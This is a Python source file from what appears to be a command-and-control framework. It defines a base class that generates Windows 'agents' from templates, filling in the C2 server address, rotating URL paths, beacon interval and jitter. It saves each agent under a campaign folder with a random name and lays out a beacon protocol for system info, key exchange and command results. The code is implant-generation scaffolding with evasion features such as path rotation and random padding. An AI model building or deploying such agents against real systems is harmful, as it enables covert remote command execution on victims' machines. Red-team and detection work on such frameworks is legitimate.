from abc import abstractmethod
from typing import Dict, Any, List, Optional, Union
import os
import base64
import json
import time
import datetime
import random
import string

from plugins.agent_plugin_interface import AgentPluginInterface

class BaseAgentPlugin(AgentPluginInterface):
    """Base class for agent plugins with standard communication implementation"""
    
    @classmethod
    @abstractmethod
    def get_name(cls) -> str:
        """Return the name of this agent type for UI display"""
        pass
    
    @classmethod
    @abstractmethod
    def get_description(cls) -> str:
        """Return a description of this agent type"""
        pass
    
    @classmethod
    @abstractmethod
    def get_template_code(cls, config: Dict[str, Any], campaign_settings: Dict[str, Any]) -> str:
        """Return the template code for this agent type with placeholders"""
        pass
    
    @classmethod
    def get_agent_capabilities(cls) -> List[str]:
        """Return capabilities supported by this agent"""
        return ["dynamic_path_rotation", "secure_key_exchange", "command_execution"]
    
    @classmethod
    def get_supported_platforms(cls) -> List[str]:
        """Return platforms supported by this agent"""
        return ["windows"]
    
    @classmethod
    def generate(cls, config: Dict[str, Any], campaign_settings: Dict[str, Any]) -> Dict[str, Any]:
        """Generate the agent using the provided configuration"""
        # Generate agent code using template
        agent_code = cls.generate_agent_code(config, campaign_settings)
        
        # Save to file if campaign folder is provided
        files = []
        if "campaign_folder" in campaign_settings:
            campaign_folder = campaign_settings["campaign_folder"]
            files = cls.save_agent_files(agent_code, config, campaign_folder)
        
        # Prepare result
        result = {
            "code": agent_code,
            "files": files,
            "instructions": cls.get_usage_instructions(config, campaign_settings),
            "summary": cls.get_summary(config, campaign_settings)
        }
        
        return result
    
    @classmethod
    def generate_agent_code(cls, config: dict, campaign_settings: dict) -> str:
        """Generate agent code with proper communication patterns"""
        # Get template code
        template_code = cls.get_template_code(config, campaign_settings)
        
        # Extract required settings
        server_address = campaign_settings.get("server_address", "")
        protocol = "https" if campaign_settings.get("ssl_enabled", False) else "http"
        rotation_info = campaign_settings.get("rotation_info", {})
        
        # Extract path pool from rotation info
        path_pool = []
        if rotation_info and "current_paths" in rotation_info and "path_pool" in rotation_info["current_paths"]:
            path_pool = rotation_info["current_paths"]["path_pool"]
        
        # Convert path pool to a JavaScript array string
        path_pool_str = json.dumps(path_pool)
        
        # Extract rotation information
        rotation_id = rotation_info.get("current_rotation_id", 0)
        next_rotation_time = rotation_info.get("next_rotation_time", int(time.time()) + 3600)
        rotation_interval = rotation_info.get("rotation_interval", 3600)
        
        # Replace standard placeholders
        agent_code = template_code.replace("{{SERVER_ADDRESS}}", server_address)
        agent_code = agent_code.replace("{{PROTOCOL}}", protocol)
        agent_code = agent_code.replace("{{PATH_POOL}}", path_pool_str)
        agent_code = agent_code.replace("{{ROTATION_ID}}", str(rotation_id))
        agent_code = agent_code.replace("{{NEXT_ROTATION_TIME}}", str(next_rotation_time))
        agent_code = agent_code.replace("{{ROTATION_INTERVAL}}", str(rotation_interval))
        
        # Replace all config values - convert types appropriately
        for key, value in config.items():
            placeholder = "{{" + key.upper() + "}}"
            
            # Handle different types appropriately
            if isinstance(value, bool):
                agent_code = agent_code.replace(placeholder, str(value).lower())
            elif isinstance(value, (int, float)):
                agent_code = agent_code.replace(placeholder, str(value))
            elif isinstance(value, str):
                agent_code = agent_code.replace(placeholder, value)
            elif value is None:
                agent_code = agent_code.replace(placeholder, "null")
            else:
                # For complex types like lists or dicts, convert to JSON
                try:
                    json_value = json.dumps(value)
                    agent_code = agent_code.replace(placeholder, json_value)
                except (TypeError, ValueError):
                    # If JSON conversion fails, use string representation
                    agent_code = agent_code.replace(placeholder, str(value))
        
        # Additionally replace any campaign settings placeholders
        for key, value in campaign_settings.items():
            if key not in ["server_address", "rotation_info"]:  # Skip already handled ones
                placeholder = "{{" + key.upper() + "}}"
                
                # Handle different types
                if isinstance(value, bool):
                    agent_code = agent_code.replace(placeholder, str(value).lower())
                elif isinstance(value, (int, float)):
                    agent_code = agent_code.replace(placeholder, str(value))
                elif isinstance(value, str):
                    agent_code = agent_code.replace(placeholder, value)
                elif value is None:
                    agent_code = agent_code.replace(placeholder, "null")
        
        return agent_code
    
    @classmethod
    def save_agent_files(cls, agent_code: str, config: Dict[str, Any], campaign_folder: str) -> List[str]:
        """Save agent files to campaign folder"""
        files = []
        agents_folder = os.path.join(campaign_folder, "agents")
        os.makedirs(agents_folder, exist_ok=True)
        
        # Determine file extension based on agent type
        file_ext = cls.get_file_extension()
        
        # Generate filename with random component
        random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        file_name = f"{cls.get_name().lower()}_agent_{random_id}.{file_ext}"
        file_path = os.path.join(agents_folder, file_name)
        
        # Write agent code to file
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(agent_code)
        
        files.append(file_path)
        return files
    
    @classmethod
    def get_file_extension(cls) -> str:
        """Get the file extension for this agent type"""
        # Override in subclasses
        return "txt"
    
    @classmethod
    def get_usage_instructions(cls, config: Dict[str, Any], campaign_settings: Dict[str, Any]) -> str:
        """Get usage instructions for this agent"""
        server_address = campaign_settings.get("server_address", "UNKNOWN")
        protocol = campaign_settings.get("http_protocol", "http")
        
        return (
            f"Use this agent to connect to your C2 server at {protocol}://{server_address}.\n"
            f"The agent will establish a secure connection using dynamic paths and encryption."
        )
    
    @classmethod
    def get_summary(cls, config: Dict[str, Any], campaign_settings: Dict[str, Any]) -> str:
        """Get a summary of the generated agent"""
        return (
            f"{cls.get_name()} agent generated with "
            f"{config.get('beacon_period', 0)}s beacon interval "
            f"and {config.get('jitter_percentage', 0)}% jitter."
        )
    
    @classmethod
    def get_communication_protocol_template(cls) -> Dict[str, Any]:
        """Get a template for the communication protocol"""
        return {
            "first_contact": {
                "beacon_request": {
                    "c": "{{CLIENT_ID}}",  # Client ID
                    "f": True,             # First contact flag
                    "d": "{{SYSTEM_INFO}}",  # Basic system info
                    "t": "{{TOKEN_PADDING}}"  # Random padding
                },
                "beacon_response": {
                    "pubkey": "{{SERVER_PUBLIC_KEY}}",  # Server's RSA public key
                    "c": "{{CLIENT_ID}}",  # Server-assigned client ID
                    "f": True,             # First contact acknowledgement
                    "r": {                 # Rotation info
                        "cid": "{{ROTATION_ID}}",
                        "nrt": "{{NEXT_ROTATION_TIME}}"
                    }
                },
                "key_registration": {
                    "encrypted_key": "{{ENCRYPTED_CLIENT_KEY}}",
                    "client_id": "{{CLIENT_ID}}",
                    "nonce": "{{RANDOM_NONCE}}"
                }
            },
            "standard_operation": {
                "beacon_request": {
                    "d": "{{ENCRYPTED_OPERATION}}",  # Encrypted operation data
                    "t": "{{TOKEN_PADDING}}"         # Random padding
                },
                "operation_payload": {
                    "op_type": "beacon",
                    "payload": "{{SYSTEM_INFO}}"
                },
                "command_result": {
                    "op_type": "result",
                    "payload": {
                        "timestamp": "{{COMMAND_TIMESTAMP}}",
                        "result": "{{COMMAND_RESULT}}"
                    }
                }
            }
        }